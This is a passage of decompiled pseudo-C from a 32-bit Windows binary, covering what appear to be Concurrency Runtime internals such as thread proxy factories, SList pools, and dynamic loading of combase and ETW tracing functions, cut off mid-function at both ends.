                                                           + 52 * *(_DWORD *)(a2 + 40)
                                                           + 24));
  if ( result == 1 )
  {
    v3 = this[3];
    result = this[32] == this[33];
    if ( *(_DWORD *)(v3 + 16) > result )
      return SetEvent(*(HANDLE *)(v3 + 80));
  }
  return result;
}

//----- (0047B403) --------------------------------------------------------
char __thiscall sub_47B403(_DWORD *this, int a2, int a3, char a4)
{
  int v4; // edx
  int v6; // edi
  int v7; // ecx
  int v8; // eax

  v4 = 52 * a2;
  v6 = 52 * a3 + *(_DWORD *)(this[4] + 52 * a2 + 48);
  v7 = *(_DWORD *)(v6 + 40);
  LOBYTE(v8) = v7 + 1;
  *(_DWORD *)(v6 + 40) = v7 + 1;
  if ( v7 )
  {
LABEL_7:
    if ( a4 )
    {
      ++this[45];
      ++*(_DWORD *)(v6 + 44);
    }
    return v8;
  }
  v8 = v4 + this[4];
  ++*(_DWORD *)(v8 + 36);
  ++this[43];
  if ( *(_BYTE *)(v6 + 49) )
  {
    *(_BYTE *)(v6 + 50) = 1;
    LOBYTE(v8) = sub_47B789(this, v8, a3);
    v4 = 52 * a2;
  }
  if ( a4 )
  {
    v8 = *(_DWORD *)(this[4] + v4 + 48);
    if ( !*(_DWORD *)(v8 + 52 * a3 + 36) )
      ++this[46];
    goto LABEL_7;
  }
  return v8;
}

//----- (0047B489) --------------------------------------------------------
_DWORD *__thiscall sub_47B489(_DWORD *this)
{
  void *v1; // ebx
  LPVOID v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // ebx
  int v8; // edi
  int v9; // eax

  v1 = this;
  v2 = sub_46F930(*(_DWORD *)(this[3] + 112));
  v3 = (int)v2;
  if ( !v2 )
    return 0;
  v4 = (unsigned __int8)v2 & 3;
  if ( !v4 )
  {
LABEL_6:
    sub_479EED(v3);
    goto LABEL_12;
  }
  if ( v4 == 1 )
  {
    v3 = *(_DWORD *)((v3 & 0xFFFFFFFE) + 16) + 8;
    v5 = *(_DWORD *)(v3 + 28);
    if ( v5 && *(_BYTE *)(v5 + 68) )
      return 0;
    goto LABEL_6;
  }
  v6 = v3 & 0xFFFFFFFD;
  v7 = v6 + 4;
  (*(void (__thiscall **)(unsigned int))(*(_DWORD *)(v6 + 4) + 16))(v6 + 4);
  v8 = *(_DWORD *)(v6 + 32);
  v9 = *(_DWORD *)(v8 + 44);
  v3 = v8 + 16;
  if ( v9 && *(_BYTE *)(v9 + 68) )
    v3 = 0;
  else
    sub_479EED(v3);
  (*(void (__thiscall **)(unsigned int))(*(_DWORD *)v7 + 20))(v7);
  v1 = this;
LABEL_12:
  if ( v3 )
    return sub_47B08E(v1, (_DWORD *)v3);
  return 0;
}

//----- (0047B532) --------------------------------------------------------
int __thiscall sub_47B532(_DWORD *this, int a2)
{
  int result; // eax

  --*this;
  *(_DWORD *)(*(_DWORD *)(a2 + 56) + 52) = *(_DWORD *)(a2 + 52);
  *(_DWORD *)(*(_DWORD *)(a2 + 52) + 56) = *(_DWORD *)(a2 + 56);
  result = this[1];
  if ( a2 == result )
  {
    if ( result == *(_DWORD *)(result + 56) )
      result = 0;
    else
      result = *(_DWORD *)(result + 52);
    this[1] = result;
  }
  return result;
}

//----- (0047B568) --------------------------------------------------------
void __thiscall sub_47B568(_DWORD *this, int a2, int a3)
{
  int v4; // ebx
  int v5; // ecx
  struct _RTL_CRITICAL_SECTION *v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // esi
  int v10; // ecx
  int v11; // ebx
  struct _RTL_CRITICAL_SECTION *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+14h] [ebp-18h]
  int v14; // [esp+18h] [ebp-14h] BYREF
  _DWORD *v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+28h] [ebp-4h]

  v15 = this;
  --*(_DWORD *)(a2 + 28);
  --this[40];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  v13 = v4;
  v5 = *(_DWORD *)(v4 + 36);
  *(_DWORD *)v4 = 1;
  if ( v5 == this[36] )
  {
    ++this[41];
    v5 = *(_DWORD *)(v4 + 36);
  }
  this[44] -= v5;
  *(_DWORD *)(v4 + 36) = 0;
  if ( *(_BYTE *)(v4 + 49) )
    sub_47B789(this, a2, a3);
  v6 = (struct _RTL_CRITICAL_SECTION *)(this + 8);
  *(_BYTE *)(v4 + 48) = 0;
  v12 = v6;
  sub_46F04D(v6);
  v16 = 0;
  v7 = *(_DWORD *)(v4 + 16);
  if ( v7 )
    v8 = *(_DWORD *)(v7 + 56);
  else
    v8 = 0;
  if ( v8 )
  {
    v9 = (int)v15;
    do
    {
      if ( v8 == *(_DWORD *)(v4 + 16) )
        v15 = 0;
      else
        v15 = *(_DWORD **)(v8 + 56);
      v10 = *(_DWORD *)(v8 + 28);
      if ( v10 && !*(_BYTE *)(v10 + 68) )
      {
        *(_BYTE *)(v10 + 68) = 1;
        v11 = *(_DWORD *)(v9 + 8);
        v14 = v10;
        (*(void (__thiscall **)(int, int *, int))(*(_DWORD *)v11 + 16))(v11, &v14, 1);
        v4 = v13;
      }
      v8 = (int)v15;
    }
    while ( v15 );
    v6 = v12;
  }
  v16 = 1;
  sub_46F193(v6);
}

//----- (0047B652) --------------------------------------------------------
void __thiscall sub_47B652(_DWORD *this, _DWORD *a2)
{
  sub_47B532(this + 49, (int)a2);
  if ( a2 )
  {
    *a2 = &Concurrency::details::ExecutionResource::`vftable';
    sub_46C87D(a2);
  }
}
// 4C0DF4: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (0047B67E) --------------------------------------------------------
_DWORD *__thiscall sub_47B67E(_DWORD *this, char a2)
{
  return sub_47313A(this[3], this, a2);
}

//----- (0047B691) --------------------------------------------------------
void __thiscall sub_47B691(int this, int a2, char a3)
{
  int v3; // edi
  struct _RTL_CRITICAL_SECTION *v4; // esi
  int v5; // edx
  int v6; // eax
  int v7; // eax
  char *v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // edi
  int v12; // edx
  int *v13; // ebx
  int v14; // eax
  char *Block; // [esp+18h] [ebp-38h]
  int v17; // [esp+1Ch] [ebp-34h]
  char v18[44]; // [esp+20h] [ebp-30h] BYREF
  int v19; // [esp+4Ch] [ebp-4h]

  v3 = this;
  v4 = (struct _RTL_CRITICAL_SECTION *)(this + 32);
  sub_46F04D((LPCRITICAL_SECTION)(this + 32));
  v19 = 0;
  v5 = 0;
  v6 = *(_DWORD *)(a2 + 12);
  v17 = 0;
  if ( v6 <= 8 )
  {
    v8 = v18;
    Block = v18;
  }
  else
  {
    v7 = unknown_libname_28((unsigned __int64)(unsigned int)v6 >> 30 != 0 ? -1 : 4 * v6);
    v5 = 0;
    v8 = (char *)v7;
    Block = (char *)v7;
  }
  v9 = *(_DWORD *)(a2 + 16);
  if ( v9 )
    v10 = *(_DWORD *)(v9 + 56);
  else
    v10 = 0;
  if ( v10 )
  {
    do
    {
      if ( v10 == *(_DWORD *)(a2 + 16) )
        v11 = 0;
      else
        v11 = *(_DWORD *)(v10 + 56);
      v12 = *(_DWORD *)(v10 + 28);
      if ( !v12 || *(_BYTE *)(v12 + 68) )
      {
        v5 = v17;
      }
      else
      {
        *(_DWORD *)&v8[4 * v17] = v12;
        v5 = ++v17;
      }
      v10 = v11;
    }
    while ( v11 );
    v3 = this;
  }
  v13 = *(int **)(v3 + 8);
  v14 = *v13;
  if ( a3 )
    (*(void (__thiscall **)(int *, char *, int))(v14 + 24))(v13, v8, v5);
  else
    (*(void (__thiscall **)(int *, char *, int))(v14 + 20))(v13, v8, v5);
  v19 = 1;
  sub_46F193(v4);
  if ( Block != v18 )
    j_j_j___free_base(Block);
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (0047B775) --------------------------------------------------------
int __thiscall sub_47B775(_DWORD *this)
{
  return sub_473A26(this[3], this);
}

//----- (0047B77F) --------------------------------------------------------
_DWORD *__thiscall sub_47B77F(_DWORD *this)
{
  return sub_473AF8(this[3], this);
}

//----- (0047B789) --------------------------------------------------------
char __thiscall sub_47B789(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int v4; // esi
  char result; // al

  v3 = this[42];
  v4 = *(_DWORD *)(a2 + 48) + 52 * a3;
  if ( *(_BYTE *)(v4 + 49) )
  {
    this[42] = v3 - 1;
    --*(_DWORD *)(a2 + 32);
    result = 0;
  }
  else
  {
    this[42] = v3 + 1;
    result = 1;
    ++*(_DWORD *)(a2 + 32);
  }
  *(_BYTE *)(v4 + 49) = result;
  return result;
}

//----- (0047B7C5) --------------------------------------------------------
int __stdcall sub_47B7C5(int a1)
{
  int v1; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  if ( !a1 )
  {
    sub_46A08B(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v1 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 8))(a1);
  return sub_4819D3(v1);
}

//----- (0047B80E) --------------------------------------------------------
__int32 sub_47B80E()
{
  HMODULE ModuleHandleW; // eax
  FARPROC RoInitialize; // eax
  int LastError; // eax
  HMODULE v3; // eax
  FARPROC RoUninitialize; // eax
  _DWORD pExceptionObject[4]; // [esp+8h] [ebp-10h] BYREF

  dword_4F0C40 = (int)LoadLibraryExW(L"combase.dll", 0, 0x800u);
  if ( !dword_4F0C40 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  ModuleHandleW = GetModuleHandleW(L"combase.dll");
  RoInitialize = GetProcAddress(ModuleHandleW, "RoInitialize");
  if ( !RoInitialize
    || (dword_4F0C38 = sub_46F9E3((int)RoInitialize),
        v3 = GetModuleHandleW(L"combase.dll"),
        (RoUninitialize = GetProcAddress(v3, "RoUninitialize")) == 0) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_4F0C3C = sub_46F9E3((int)RoUninitialize);
  return _InterlockedExchange(&dword_4F0C44, 1);
}
// 4F0C38: using guessed type int dword_4F0C38;
// 4F0C3C: using guessed type int dword_4F0C3C;
// 4F0C40: using guessed type int dword_4F0C40;
// 4F0C44: using guessed type __int32 dword_4F0C44;
// 47B80E: using guessed type _DWORD pExceptionObject[4];

//----- (0047B8BB) --------------------------------------------------------
int __cdecl sub_47B8BB(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_46F9E3(dword_4F0C38);
  return v1(v1, a1);
}
// 4F0C38: using guessed type int dword_4F0C38;

//----- (0047B8DD) --------------------------------------------------------
int sub_47B8DD()
{
  int (__thiscall *v0)(_DWORD); // esi

  v0 = (int (__thiscall *)(_DWORD))sub_46F9E3(dword_4F0C3C);
  return v0(v0);
}
// 4F0C3C: using guessed type int dword_4F0C3C;

//----- (0047B8F8) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_47B8F8(union _SLIST_HEADER *this, int a2)
{
  union _SLIST_HEADER *v3; // edi
  int v4; // ebx

  this->Next.Next = (struct _SINGLE_LIST_ENTRY *)&Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';
  v3 = this + 1;
  *(_DWORD *)&this->Depth = *(_DWORD *)(a2 + 8);
  v4 = 4;
  do
  {
    InitializeSListHead(v3++);
    --v4;
  }
  while ( v4 );
  return this;
}
// 4C0EF8: using guessed type void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';

//----- (0047B931) --------------------------------------------------------
_DWORD *__thiscall sub_47B931(_DWORD *this, int a2, int a3)
{
  sub_481B06(this, a2, a3);
  *this = &Concurrency::details::FreeThreadProxy::`vftable';
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[12] = 0;
  *((_WORD *)this + 26) = 0;
  return this;
}
// 4C0EB0: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (0047B966) --------------------------------------------------------
int __thiscall sub_47B966(int this, int a2)
{
  int result; // eax

  sub_47B8F8((union _SLIST_HEADER *)this, a2);
  *(_DWORD *)this = &Concurrency::details::FreeThreadProxyFactory::`vftable';
  result = this;
  *(_DWORD *)(this + 40) = 1;
  *(_BYTE *)(this + 44) = 0;
  return result;
}
// 4C0F24: using guessed type void *Concurrency::details::FreeThreadProxyFactory::`vftable';

//----- (0047B990) --------------------------------------------------------
char *__thiscall sub_47B990(char *this)
{
  *(_DWORD *)this = 0;
  *((_DWORD *)this + 1) = 0;
  sub_46ED40((struct _RTL_CRITICAL_SECTION *)(this + 12));
  *((_DWORD *)this + 2) = sub_46F8E5();
  return this;
}

//----- (0047B9C4) --------------------------------------------------------
void __thiscall sub_47B9C4(_DWORD *this)
{
  int v2; // ebx

  if ( *this )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)*this + 24))(*this);
  v2 = this[1];
  if ( v2 )
    (*(void (__thiscall **)(_DWORD))(*(_DWORD *)v2 + 24))(this[1]);
  sub_46F922(this[2]);
  sub_46EDCA((LPCRITICAL_SECTION)(this + 3));
}

//----- (0047BA3B) --------------------------------------------------------
_DWORD *__thiscall sub_47BA3B(_DWORD *this, char a2)
{
  *this = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0ECC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0047BA5E) --------------------------------------------------------
_DWORD *__thiscall sub_47BA5E(_DWORD *this, char a2)
{
  *this = &Concurrency::details::FreeThreadProxy::`vftable';
  sub_481BF4(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0EB0: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (0047BA86) --------------------------------------------------------
_DWORD *__thiscall sub_47BA86(_DWORD *this, char a2)
{
  *this = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0ECC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0047BAA9) --------------------------------------------------------
_DWORD *__thiscall sub_47BAA9(_DWORD *this, char a2)
{
  *this = &Concurrency::details::IThreadProxyFactory::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0ECC: using guessed type void *Concurrency::details::IThreadProxyFactory::`vftable';

//----- (0047BACC) --------------------------------------------------------
_DWORD *__thiscall sub_47BACC(void *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x44u);
  result = 0;
  if ( v3 )
    return sub_47B931(v3, (int)this, a2);
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047BB01) --------------------------------------------------------
int __cdecl sub_47BB01(int a1)
{
  void *v1; // eax

  sub_47BDEA();
  v1 = operator new(0x30u);
  if ( v1 )
    return sub_47B966((int)v1, a1);
  else
    return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047BB29) --------------------------------------------------------
int __thiscall sub_47BB29(_DWORD *this)
{
  return this[1];
}

//----- (0047BB2D) --------------------------------------------------------
int __thiscall sub_47BB2D(char *this)
{
  if ( !*(_DWORD *)this )
  {
    sub_46F04D((LPCRITICAL_SECTION)(this + 12));
    if ( !*(_DWORD *)this )
      *(_DWORD *)this = sub_47BB01((int)this);
    sub_46F193((LPCRITICAL_SECTION)(this + 12));
  }
  return *(_DWORD *)this;
}

//----- (0047BB75) --------------------------------------------------------
BOOL __stdcall sub_47BB75(_DWORD *a1, int a2)
{
  BOOL result; // eax

  result = a2;
  if ( a1[6] != a2 )
    return sub_481C96(a1, a2);
  return result;
}

//----- (0047BB8D) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_47BB8D(char *this, struct _SINGLE_LIST_ENTRY *a2)
{
  struct _SINGLE_LIST_ENTRY *v2; // esi
  PSLIST_ENTRY result; // eax
  union _SLIST_HEADER *v5; // ebx

  v2 = a2;
  result = 0;
  while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_4C0EE4[(_DWORD)result] )
  {
    result = (PSLIST_ENTRY)((char *)result + 1);
    if ( (int)result >= 4 )
      goto LABEL_7;
  }
  v5 = (union _SLIST_HEADER *)&this[8 * (_DWORD)result + 8];
  result = (PSLIST_ENTRY)QueryDepthSList(v5);
  if ( (unsigned __int16)result < dword_4F0C48 )
  {
    result = InterlockedPushEntrySList(v5, a2 + 15);
    v2 = 0;
  }
LABEL_7:
  if ( v2 )
    return (PSLIST_ENTRY)(*(int (__thiscall **)(char *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, v2);
  return result;
}
// 4C0EE4: using guessed type int dword_4C0EE4[4];
// 4F0C48: using guessed type int dword_4F0C48;

//----- (0047BBF0) --------------------------------------------------------
void __thiscall sub_47BBF0(_BYTE *this, struct _SINGLE_LIST_ENTRY *a2)
{
  struct _SINGLE_LIST_ENTRY *v3; // esi
  int v4; // eax
  union _SLIST_HEADER *v5; // edi
  PSLIST_ENTRY v6; // eax
  int i; // edx
  int v8; // edi

  v3 = a2;
  if ( !this[44] )
  {
    v4 = 0;
    while ( a2[5].Next != (struct _SINGLE_LIST_ENTRY *)dword_4C0EE4[v4] )
    {
      if ( ++v4 >= 4 )
        goto LABEL_11;
    }
    v5 = (union _SLIST_HEADER *)&this[8 * v4 + 8];
    if ( QueryDepthSList(v5) < dword_4F0C48 )
    {
      InterlockedPushEntrySList(v5, a2 + 15);
      if ( this[44] )
      {
        v6 = InterlockedFlushSList(v5);
        for ( i = v6 != 0 ? (unsigned int)&v6[-15] : 0; i; i = v8 != 0 ? v8 - 60 : 0 )
        {
          v8 = *(_DWORD *)(i + 60);
          (*(void (__thiscall **)(_BYTE *, int))(*(_DWORD *)this + 32))(this, i);
        }
      }
      v3 = 0;
    }
  }
LABEL_11:
  if ( v3 )
    (*(void (__thiscall **)(_BYTE *, struct _SINGLE_LIST_ENTRY *))(*(_DWORD *)this + 32))(this, v3);
}
// 4C0EE4: using guessed type int dword_4C0EE4[4];
// 4F0C48: using guessed type int dword_4F0C48;

//----- (0047BC95) --------------------------------------------------------
signed __int32 __thiscall sub_47BC95(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 10);
}

//----- (0047BC9F) --------------------------------------------------------
signed __int32 __thiscall sub_47BC9F(volatile signed __int32 *this)
{
  signed __int32 v1; // ebx

  v1 = _InterlockedDecrement(this + 10);
  if ( !v1 && this )
    (*(void (__thiscall **)(volatile signed __int32 *, int))(*this + 20))(this, 1);
  return v1;
}

//----- (0047BCCC) --------------------------------------------------------
int __thiscall sub_47BCCC(union _SLIST_HEADER *this, unsigned int a2, int a3)
{
  unsigned int v4; // ecx
  int *v5; // esi
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // edi
  union _SLIST_HEADER *v10; // [esp+Ch] [ebp-4h]

  v4 = a2;
  v5 = dword_4C0EE4;
  v6 = this + 1;
  v10 = this + 1;
  do
  {
    if ( v4 <= *v5 )
    {
      v7 = InterlockedPopEntrySList(v6);
      v8 = v7 != 0 ? (unsigned int)&v7[-15] : 0;
      if ( v8 )
        goto LABEL_7;
      v6 = v10;
      v4 = a2;
    }
    ++v5;
    v10 = ++v6;
  }
  while ( (int)v5 < (int)&off_4C0EF4 );
  v8 = ((int (__thiscall *)(union _SLIST_HEADER *, unsigned int))this->Next.Next[7].Next)(this, v4);
  if ( !v8 )
    return v8;
LABEL_7:
  ((void (__thiscall *)(union _SLIST_HEADER *, int, int))this->Next.Next[9].Next)(this, v8, a3);
  return v8;
}
// 47BD16: conditional instruction was optimized away because edi.4==0
// 4C0EE4: using guessed type int dword_4C0EE4[4];
// 4C0EF4: using guessed type int off_4C0EF4;

//----- (0047BD4E) --------------------------------------------------------
BOOL __stdcall sub_47BD4E(_DWORD *a1)
{
  return sub_481C77(a1);
}

//----- (0047BD5D) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_47BD5D(union _SLIST_HEADER *this)
{
  int v1; // esi
  union _SLIST_HEADER *v2; // ebx
  PSLIST_ENTRY result; // eax
  int v4; // edx
  int v5; // edi
  int v7; // [esp+10h] [ebp-8h]
  union _SLIST_HEADER *v8; // [esp+14h] [ebp-4h]

  v1 = 4;
  v2 = this + 1;
  v8 = this + 1;
  v7 = 4;
  do
  {
    result = InterlockedFlushSList(v2);
    v4 = result != 0 ? (unsigned int)&result[-15] : 0;
    if ( v4 )
    {
      do
      {
        v5 = *(_DWORD *)(v4 + 60);
        ((void (__thiscall *)(union _SLIST_HEADER *, int))this->Next.Next[8].Next)(this, v4);
        result = (PSLIST_ENTRY)(v5 - 60);
        v4 = v5 != 0 ? v5 - 60 : 0;
      }
      while ( v4 );
      v2 = v8;
      v1 = v7;
    }
    ++v2;
    --v1;
    v8 = v2;
    v7 = v1;
  }
  while ( v1 );
  return result;
}

//----- (0047BDC9) --------------------------------------------------------
int __thiscall sub_47BDC9(int this)
{
  *(_BYTE *)(this + 44) = 1;
  sub_47BD5D((union _SLIST_HEADER *)this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)this + 12))(this);
}

//----- (0047BDEA) --------------------------------------------------------
void sub_47BDEA()
{
  if ( !dword_4F0C48 )
    dword_4F0C48 = 4 * sub_471D0E();
}
// 4F0C48: using guessed type int dword_4F0C48;

//----- (0047BE06) --------------------------------------------------------
int *__thiscall sub_47BE06(int *this)
{
  HMODULE Library; // esi
  ULONG (__stdcall *RegisterTraceGuidsW)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE); // eax
  ULONG (__stdcall *UnregisterTraceGuids)(TRACEHANDLE); // eax
  ULONG (__stdcall *TraceEvent)(TRACEHANDLE, PEVENT_TRACE_HEADER); // eax
  TRACEHANDLE (__stdcall *GetTraceLoggerHandle)(PVOID); // eax
  UCHAR (__stdcall *GetTraceEnableLevel)(TRACEHANDLE); // eax
  ULONG (__stdcall *GetTraceEnableFlags)(TRACEHANDLE); // eax

  Library = LoadLibraryExW(L"advapi32.dll", 0, 0x800u);
  if ( Library || GetLastError() == 87 && (Library = LoadLibraryW(L"advapi32.dll")) != 0 )
  {
    RegisterTraceGuidsW = (ULONG (__stdcall *)(WMIDPREQUEST, PVOID, LPCGUID, ULONG, PTRACE_GUID_REGISTRATION, LPCWSTR, LPCWSTR, PTRACEHANDLE))GetProcAddress(Library, "RegisterTraceGuidsW");
    *this = sub_46F9E3((int)RegisterTraceGuidsW);
    UnregisterTraceGuids = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "UnregisterTraceGuids");
    this[1] = sub_46F9E3((int)UnregisterTraceGuids);
    TraceEvent = (ULONG (__stdcall *)(TRACEHANDLE, PEVENT_TRACE_HEADER))GetProcAddress(Library, "TraceEvent");
    this[2] = sub_46F9E3((int)TraceEvent);
    GetTraceLoggerHandle = (TRACEHANDLE (__stdcall *)(PVOID))GetProcAddress(Library, "GetTraceLoggerHandle");
    this[3] = sub_46F9E3((int)GetTraceLoggerHandle);
    GetTraceEnableLevel = (UCHAR (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableLevel");
    this[4] = sub_46F9E3((int)GetTraceEnableLevel);
    GetTraceEnableFlags = (ULONG (__stdcall *)(TRACEHANDLE))GetProcAddress(Library, "GetTraceEnableFlags");
    this[5] = sub_46F9E3((int)GetTraceEnableFlags);
  }
  return this;
}

//----- (0047BF00) --------------------------------------------------------
DWORD __stdcall sub_47BF00(int a1, int a2, int a3, int a4)
{
  DWORD result; // eax
  int v5; // edx
  char v6; // bl
  int v7; // eax

  if ( a1 == 4 )
  {
    dword_4F0C60 = sub_47C040((_DWORD *)dword_4F0C68, a4);
    dword_4F0C64 = v5;
    if ( dword_4F0C60 == -1 )
      return GetLastError();
    SetLastError(0);
    v6 = sub_47C003((_DWORD *)dword_4F0C68, dword_4F0C60, dword_4F0C64);
    if ( !v6 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v6 = 4;
    }
    v7 = sub_47BFC6((_DWORD *)dword_4F0C68, dword_4F0C60, dword_4F0C64);
    if ( !v7 )
    {
      result = GetLastError();
      if ( result )
        return result;
      v7 = -1;
    }
    dword_4F0C58 = v7;
    byte_4F0C5C = v6;
  }
  else
  {
    if ( a1 != 5 )
      return 87;
    byte_4F0C5C = 0;
    dword_4F0C58 = 0;
    dword_4F0C60 = 0;
    dword_4F0C64 = 0;
  }
  return 0;
}
// 47BF47: variable 'v5' is possibly undefined
// 4F0C58: using guessed type int dword_4F0C58;
// 4F0C5C: using guessed type char byte_4F0C5C;
// 4F0C60: using guessed type int dword_4F0C60;
// 4F0C64: using guessed type int dword_4F0C64;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (0047BFC6) --------------------------------------------------------
int __thiscall sub_47BFC6(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[5];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_46F9E3((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (0047C003) --------------------------------------------------------
char __thiscall sub_47C003(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[4];
  if ( v3 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return 0;
  }
  else
  {
    v4 = (int (__thiscall *)(_DWORD, int, int))sub_46F9E3((int)v3);
    return v4(v4, a2, a3);
  }
}

//----- (0047C040) --------------------------------------------------------
int __thiscall sub_47C040(_DWORD *this, int a2)
{
  PVOID v2; // esi
  int (__thiscall *v3)(_DWORD, int); // esi

  v2 = (PVOID)this[3];
  if ( v2 == EncodePointer(0) )
  {
    SetLastError(0x7Fu);
    return -1;
  }
  else
  {
    v3 = (int (__thiscall *)(_DWORD, int))sub_46F9E3((int)v2);
    return v3(v3, a2);
  }
}

//----- (0047C07D) --------------------------------------------------------
int __thiscall sub_47C07D(void **this, int a2, int a3, int a4, int a5, int a6)
{
  PVOID v6; // esi
  int (__thiscall *v7)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int); // esi

  v6 = *this;
  if ( v6 == EncodePointer(0) )
    return 127;
  v7 = (int (__thiscall *)(_DWORD, int, _DWORD, int, int, int, _DWORD, _DWORD, int))sub_46F9E3((int)v6);
  return v7(v7, a2, 0, a3, a4, a5, 0, 0, a6);
}

//----- (0047C0C1) --------------------------------------------------------
int __thiscall sub_47C0C1(_DWORD *this, int a2, int a3, int a4)
{
  PVOID v4; // esi
  int (__thiscall *v5)(_DWORD, int, int, int); // esi

  v4 = (PVOID)this[2];
  if ( v4 == EncodePointer(0) )
    return 127;
  v5 = (int (__thiscall *)(_DWORD, int, int, int))sub_46F9E3((int)v4);
  return v5(v5, a2, a3, a4);
}

//----- (0047C0FA) --------------------------------------------------------
int __thiscall sub_47C0FA(_DWORD *this, int a2, int a3)
{
  PVOID v3; // esi
  int (__thiscall *v4)(_DWORD, int, int); // esi

  v3 = (PVOID)this[1];
  if ( v3 == EncodePointer(0) )
    return 127;
  v4 = (int (__thiscall *)(_DWORD, int, int))sub_46F9E3((int)v3);
  return v4(v4, a2, a3);
}

//----- (0047C130) --------------------------------------------------------
__int32 sub_47C130()
{
  __int32 result; // eax
  int *v1; // eax
  int *v2; // eax

  result = sub_46FC8F(&dword_4F0C30);
  if ( !dword_4F0C68 )
  {
    v1 = (int *)operator new(0x18u);
    if ( v1 )
      v2 = sub_47BE06(v1);
    else
      v2 = 0;
    dword_4F0C68 = (int)v2;
    result = sub_47C07D((void **)v2, (int)sub_47BF00, (int)&unk_4C0F4C, 7, (int)&off_4E81FC, (int)&dword_4F0C50);
  }
  dword_4F0C30 = 0;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4E81FC: using guessed type void *off_4E81FC;
// 4F0C30: using guessed type int dword_4F0C30;
// 4F0C50: using guessed type int dword_4F0C50;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (0047C19F) --------------------------------------------------------
void sub_47C19F()
{
  if ( dword_4F0C68 )
  {
    byte_4F0C5C = 0;
    dword_4F0C58 = 0;
    sub_47C0FA((_DWORD *)dword_4F0C68, dword_4F0C50, dword_4F0C54);
    sub_46C87D((void *)dword_4F0C68);
    dword_4F0C68 = 0;
  }
}
// 4F0C50: using guessed type int dword_4F0C50;
// 4F0C54: using guessed type int dword_4F0C54;
// 4F0C58: using guessed type int dword_4F0C58;
// 4F0C5C: using guessed type char byte_4F0C5C;
// 4F0C68: using guessed type int dword_4F0C68;

//----- (0047C1E2) --------------------------------------------------------
int __cdecl sub_47C1E2(int (__thiscall ***a1)(_DWORD, int))
{
  int result; // eax

  if ( a1 )
    return (**a1)(a1, 1);
  return result;
}

//----- (0047C204) --------------------------------------------------------
_DWORD *__thiscall sub_47C204(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx
  void *v7; // [esp-8h] [ebp-1Ch]

  *this = 0;
  this[1] = 0;
  this[5] = a2;
  this[2] = 63;
  this[3] = unknown_libname_28(256);
  v3 = unknown_libname_28(512);
  if ( v3 )
  {
